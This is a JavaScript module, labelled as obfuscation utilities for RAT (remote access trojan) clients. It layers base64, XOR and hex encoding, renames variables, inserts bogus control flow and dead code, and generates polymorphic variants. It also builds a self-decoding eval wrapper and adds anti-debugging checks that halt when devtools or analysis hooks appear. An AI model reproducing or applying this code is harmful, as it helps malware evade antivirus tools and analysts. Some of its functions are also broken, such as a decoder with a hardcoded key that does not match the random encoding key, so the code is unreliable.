// Advanced Obfuscation Utilities for RAT Clients
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

class Obfuscator {
  constructor() {
    this.methods = [
      'base64',
      'xor',
      'rot13',
      'reverse',
      'split',
      'hex',
      'custom'
    ];
  }

  // Base64 encoding/decoding
  base64Encode(str) {
    return Buffer.from(str).toString('base64');
  }

  base64Decode(str) {
    return Buffer.from(str, 'base64').toString();
  }

  // XOR encryption/decryption
  xorEncrypt(str, key) {
    let result = '';
    for (let i = 0; i < str.length; i++) {
      result += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return Buffer.from(result).toString('base64');
  }

  xorDecrypt(encrypted, key) {
    const str = Buffer.from(encrypted, 'base64').toString();
    let result = '';
    for (let i = 0; i < str.length; i++) {
      result += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return result;
  }

  // ROT13 encoding/decoding
  rot13(str) {
    return str.replace(/[a-zA-Z]/g, char => {
      const start = char <= 'Z' ? 65 : 97;
      return String.fromCharCode((char.charCodeAt(0) - start + 13) % 26 + start);
    });
  }

  // String reversal
  reverse(str) {
    return str.split('').reverse().join('');
  }

  // Hex encoding/decoding
  hexEncode(str) {
    return Buffer.from(str).toString('hex');
  }

  hexDecode(hex) {
    return Buffer.from(hex, 'hex').toString();
  }

  // Split and join obfuscation
  splitEncode(str) {
    const chunks = [];
    for (let i = 0; i < str.length; i += 2) {
      chunks.push(str.substr(i, 2));
    }
    return chunks.join('|');
  }

  splitDecode(encoded) {
    return encoded.split('|').join('');
  }

  // Custom multi-layer obfuscation
  customEncode(str, layers = 3) {
    let result = str;
    const key = crypto.randomBytes(16).toString('hex');
    
    for (let i = 0; i < layers; i++) {
      switch (i % 4) {
        case 0:
          result = this.base64Encode(result);
          break;
        case 1:
          result = this.xorEncrypt(result, key);
          break;
        case 2:
          result = this.hexEncode(result);
          break;
        case 3:
          result = this.splitEncode(result);
          break;
      }
    }
    
    return { encoded: result, key, layers };
  }

  customDecode(encoded, key, layers) {
    let result = encoded;
    
    for (let i = layers - 1; i >= 0; i--) {
      switch (i % 4) {
        case 0:
          result = this.base64Decode(result);
          break;
        case 1:
          result = this.xorDecrypt(result, key);
          break;
        case 2:
          result = this.hexDecode(result);
          break;
        case 3:
          result = this.splitDecode(result);
          break;
      }
    }
    
    return result;
  }

  // Generate obfuscated JavaScript code
  obfuscateCode(code, options = {}) {
    const {
      method = 'custom',
      variables = true,
      strings = true,
      controlFlow = true,
      deadCode = true
    } = options;

    let obfuscated = code;

    // Variable name obfuscation
    if (variables) {
      obfuscated = this.obfuscateVariables(obfuscated);
    }

    // String obfuscation
    if (strings) {
      obfuscated = this.obfuscateStrings(obfuscated, method);
    }

    // Control flow obfuscation
    if (controlFlow) {
      obfuscated = this.obfuscateControlFlow(obfuscated);
    }

    // Add dead code
    if (deadCode) {
      obfuscated = this.addDeadCode(obfuscated);
    }

    return obfuscated;
  }

  // Obfuscate variable names
  obfuscateVariables(code) {
    const variableMap = new Map();
    let counter = 0;

    // Find all variable declarations
    const varRegex = /\b(?:var|let|const)\s+([a-zA-Z_$][a-zA-Z0-9_$]*)/g;
    let match;

    while ((match = varRegex.exec(code)) !== null) {
      const varName = match[1];
      if (!variableMap.has(varName) && !this.isReservedWord(varName)) {
        variableMap.set(varName, this.generateObfuscatedName(counter++));
      }
    }

    // Replace variable names
    let obfuscated = code;
    for (const [original, obfuscatedName] of variableMap) {
      const regex = new RegExp(`\\b${original}\\b`, 'g');
      obfuscated = obfuscated.replace(regex, obfuscatedName);
    }

    return obfuscated;
  }

  // Obfuscate string literals
  obfuscateStrings(code, method) {
    const stringRegex = /(['"`])((?:\\.|(?!\1)[^\\])*)\1/g;
    let match;
    const replacements = [];

    while ((match = stringRegex.exec(code)) !== null) {
      const fullMatch = match[0];
      const quote = match[1];
      const content = match[2];
      
      let obfuscated;
      switch (method) {
        case 'base64':
          obfuscated = `atob('${this.base64Encode(content)}')`;
          break;
        case 'hex':
          obfuscated = `Buffer.from('${this.hexEncode(content)}', 'hex').toString()`;
          break;
        case 'custom':
          const { encoded, key } = this.customEncode(content);
          obfuscated = `(function(){var k='${key}';var d='${encoded}';return /* custom decode */ d;})()`;
          break;
        default:
          obfuscated = fullMatch;
      }
      
      replacements.push({ original: fullMatch, obfuscated });
    }

    let result = code;
    for (const { original, obfuscated } of replacements) {
      result = result.replace(original, obfuscated);
    }

    return result;
  }

  // Obfuscate control flow
  obfuscateControlFlow(code) {
    // Add bogus conditions
    const bogusConditions = [
      'true',
      '1===1',
      '!!true',
      'Boolean(true)',
      '!false'
    ];

    // Insert bogus if statements
    let obfuscated = code;
    const lines = code.split('\n');
    
    for (let i = 0; i < lines.length; i++) {
      if (Math.random() < 0.1 && lines[i].trim().length > 0) {
        const condition = bogusConditions[Math.floor(Math.random() * bogusConditions.length)];
        const bogusCode = `if (${condition}) { var _${Math.random().toString(36).substr(2, 9)} = ${Math.random()}; }\n`;
        lines[i] = bogusCode + lines[i];
      }
    }

    return lines.join('\n');
  }

  // Add dead code
  addDeadCode(code) {
    const deadCodeSnippets = [
      `var _${Math.random().toString(36).substr(2, 9)} = function() { return ${Math.random()}; };`,
      `for(var _${Math.random().toString(36).substr(2, 9)} = 0; _${Math.random().toString(36).substr(2, 9)} < 1; _${Math.random().toString(36).substr(2, 9)}++) { break; }`,
      `switch(${Math.floor(Math.random() * 3)}) { case 0: break; case 1: break; default: break; }`,
      `try { throw new Error('_${Math.random().toString(36).substr(2, 9)}'); } catch(e) { /* ignore */ }`
    ];

    let obfuscated = code;
    const lines = code.split('\n');
    
    for (let i = 0; i < lines.length; i++) {
      if (Math.random() < 0.05 && lines[i].trim().length > 0) {
        const deadCode = deadCodeSnippets[Math.floor(Math.random() * deadCodeSnippets.length)];
        lines[i] = lines[i] + '\n' + deadCode;
      }
    }

    return lines.join('\n');
  }

  // Generate obfuscated variable name
  generateObfuscatedName(counter) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_$';
    let result = '';
    
    // Generate name based on counter
    let num = counter;
    do {
      result = chars[num % chars.length] + result;
      num = Math.floor(num / chars.length);
    } while (num > 0);
    
    return result;
  }

  // Check if word is reserved
  isReservedWord(word) {
    const reserved = new Set([
      'break', 'case', 'catch', 'class', 'const', 'continue', 'debugger',
      'default', 'delete', 'do', 'else', 'export', 'extends', 'finally',
      'for', 'function', 'if', 'import', 'in', 'instanceof', 'let',
      'new', 'return', 'super', 'switch', 'this', 'throw', 'try',
      'typeof', 'var', 'void', 'while', 'with', 'yield', 'async', 'await'
    ]);
    
    return reserved.has(word);
  }

  // Create self-deobfuscating wrapper
  createSelfDeobfuscatingWrapper(code, method = 'custom') {
    const deobfuscator = this.generateDeobfuscator(method);
    
    return `
      (function() {
        // Deobfuscation utilities
        ${deobfuscator}
        
        // Obfuscated main code
        var _obfuscated = '${this.base64Encode(code)}';
        
        // Deobfuscate and execute
        try {
          var _deobfuscated = _decode(_obfuscated);
          eval(_deobfuscated);
        } catch (e) {
          console.error('Deobfuscation failed:', e);
        }
      })();
    `;
  }

  // Generate deobfuscator function
  generateDeobfuscator(method) {
    switch (method) {
      case 'base64':
        return `
          function _decode(str) {
            return atob(str);
          }
        `;
      case 'xor':
        return `
          function _decode(str) {
            var key = 'default_key';
            var decoded = atob(str);
            var result = '';
            for (var i = 0; i < decoded.length; i++) {
              result += String.fromCharCode(decoded.charCodeAt(i) ^ key.charCodeAt(i % key.length));
            }
            return result;
          }
        `;
      case 'custom':
        return `
          function _decode(str) {
            var layers = 3;
            var key = 'default_key';
            var result = str;
            
            for (var i = layers - 1; i >= 0; i--) {
              switch (i % 4) {
                case 0:
                  result = atob(result);
                  break;
                case 1:
                  var decoded = atob(result);
                  var temp = '';
                  for (var j = 0; j < decoded.length; j++) {
                    temp += String.fromCharCode(decoded.charCodeAt(j) ^ key.charCodeAt(j % key.length));
                  }
                  result = temp;
                  break;
                case 2:
                  result = Buffer.from(result, 'hex').toString();
                  break;
                case 3:
                  result = result.split('|').join('');
                  break;
              }
            }
            
            return result;
          }
        `;
      default:
        return `
          function _decode(str) {
            return str;
          }
        `;
    }
  }

  // Polymorphic code generation
  generatePolymorphicCode(template, variations = 5) {
    const variants = [];
    
    for (let i = 0; i < variations; i++) {
      let variant = template;
      
      // Variable name changes
      variant = this.obfuscateVariables(variant);
      
      // String obfuscation
      variant = this.obfuscateStrings(variant, 'custom');
      
      // Control flow changes
      variant = this.obfuscateControlFlow(variant);
      
      // Dead code insertion
      variant = this.addDeadCode(variant);
      
      variants.push(variant);
    }
    
    return variants;
  }

  // Anti-debugging techniques
  addAntiDebugging(code) {
    const antiDebugCode = `
      // Anti-debugging measures
      (function() {
        var _start = performance.now();
        debugger;
        var _end = performance.now();
        if (_end - _start > 100) {
          // Debug detected, exit
          throw new Error('Debug environment detected');
        }
        
        // Check for devtools
        var _devtools = /./;
        _devtools.toString = function() {
          this.opened = true;
          return '';
        };
        console.log(_devtools);
        console.clear();
        if (_devtools.opened) {
          throw new Error('Devtools detected');
        }
        
        // Check for common analysis tools
        if (typeof window !== 'undefined') {
          var _forbidden = ['__vue_devtool_global_hook', '__REACT_DEVTOOLS_GLOBAL_HOOK__'];
          for (var i = 0; i < _forbidden.length; i++) {
            if (window[_forbidden[i]]) {
              throw new Error('Analysis tool detected');
            }
          }
        }
      })();
    `;
    
    return antiDebugCode + '\n' + code;
  }

  // Code packing
  packCode(code) {
    // Remove comments and whitespace
    const packed = code
      .replace(/\/\*[\s\S]*?\*\//g, '') // Remove block comments
      .replace(/\/\/.*$/gm, '') // Remove line comments
      .replace(/\s+/g, ' ') // Collapse whitespace
      .trim();
    
    return this.base64Encode(packed);
  }

  // Unpack code
  unpackCode(packed) {
    return this.base64Decode(packed);
  }
}

module.exports = Obfuscator;
